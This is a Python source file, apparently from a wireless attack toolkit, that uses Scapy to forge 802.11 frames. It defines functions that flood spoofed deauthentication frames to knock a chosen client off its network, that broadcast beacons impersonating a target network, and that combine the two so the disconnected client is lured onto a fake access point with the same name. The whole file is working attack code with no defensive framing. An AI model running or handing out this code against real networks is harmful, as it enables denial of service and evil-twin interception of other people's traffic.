from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt, RandMAC
from utils import LOGGER


def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
    """Send deauthentication packets to a targeted client

    Args:
        iface (str): Interface to use
        BSSID (str): MAC address of target network
        client (str): MAC address of target client
        reason (int, optional): Reasoncode for deauthentication. Defaults to 7.
    """
    LOGGER.debug("Function 'deauth' is running")
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
        Dot11Deauth(reason=reason)
    print(f'SENDING DEAUTH to {BSSID}')
    LOGGER.info("Sending deauth packet to client: '" + client + "' from BSSID: '" + BSSID + "' through interface: '" + iface + "'.")
    sendp(packet, iface=iface, loop=1, inter=0.01)

# TODO: Keep?
def beacon(iface: str, BSSID: str, SSID: str, client: str = "ff:ff:ff:ff:ff:ff"):
    """Send beacon frames spoofed as a target network.

    Args:
        iface (str): Interface to use
        BSSID (str): MAC address of target network
        SSID (str): Name of target network
        client (str): MAC address of target client. Defaults to broadcast.
    """
    LOGGER.debug("Function 'beacon' is running")
    packet = RadioTap() / \
        Dot11(type=0, subtype=8, addr1=client, addr2=BSSID, addr3=BSSID) / \
        Dot11Beacon() / \
        Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
    print(f'SENDING BEACON for {SSID}')
    LOGGER.info("Sending beacon packet with SSID: '" + SSID + "' from BSSID: '" + BSSID + "' through interface: '" + iface + "'.")
    sendp(packet, iface=iface, loop=1, inter=0.1)

# TODO: Keep?
def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: str, reason: int = 7, timeout: int = 20):
    """Send deauth and beacon packets to disconnect a client from a network, 
       and then create a fake network with the same SSID to lure the client to connect to it.

    Args:
        iface (str): interafce to use
        SSID (str): Name of target network
        deauth_BSSID (str): MAC address of target network
        deauth_client (str): MAC address of target client
        reason (int, optional): reasoncode for deauthentication. Defaults to 7.
        timeout (int, optional): Time to run the deauth and beacons. Defaults to 20.
    """
    LOGGER.debug("Function 'deauth_with_beacon' is running")
    beacon_BSSID = str(RandMAC())
    deauth_packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=deauth_client, addr2=deauth_BSSID, addr3=deauth_BSSID) / \
        Dot11Deauth(reason=reason)
    beacon_packet = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=beacon_BSSID, addr3=beacon_BSSID) / \
        Dot11Beacon(cap='ESS+privacy') / \
        Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
    try:
        LOGGER.info("Sending deauth and beacon packets to client: '" + deauth_client + "' from BSSID: '" + deauth_BSSID + "' through interface: '" + iface + "'.")
        for i in range(timeout * 100):
            sendp(deauth_packet, iface=iface, count=1)
            print(f'SENDING DEAUTH to {deauth_BSSID}')
            sendp(beacon_packet, iface=iface, count=1)
            print(f'SENDING BEACON for {beacon_BSSID}')
    except KeyboardInterrupt:
        LOGGER.info("KeyboardInterrupt detected.")
        print("\nStopping...")
